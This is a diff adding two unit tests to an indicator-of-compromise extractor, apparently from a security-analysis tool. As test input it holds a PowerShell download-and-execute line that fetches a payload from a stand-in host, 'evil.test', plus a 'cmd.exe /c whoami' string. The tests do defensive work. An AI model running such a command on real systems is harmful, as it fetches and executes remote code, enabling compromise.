@@ -35,4 +35,21 @@ describe('extractIocs', () => {
     expect(raws).not.toContain('Net.WebClient')    // PascalCase member dropped
     expect(raws).not.toContain('wc.DownloadString')
   })
+
+  it('does not extract binary filenames (cmd.exe, kernel32.dll, amsi.dll) as domain IOCs', () => {
+    const iocs = extractIocs([
+      { index: 0, text: 'cmd.exe /c whoami & kernel32.dll amsi.dll' },
+    ])
+    const raws = iocs.map((i) => i.raw)
+    expect(raws).not.toContain('cmd.exe')
+    expect(raws).not.toContain('kernel32.dll')
+    expect(raws).not.toContain('amsi.dll')
+  })
+
+  it('still extracts a URL that ends in a denylisted extension (the denylist only guards the domain branch)', () => {
+    const iocs = extractIocs([
+      { index: 0, text: "IEX (iwr 'http://evil.test/payload.exe')" },
+    ])
+    expect(iocs.map((i) => i.raw)).toContain('http://evil.test/payload.exe')
+  })
 })
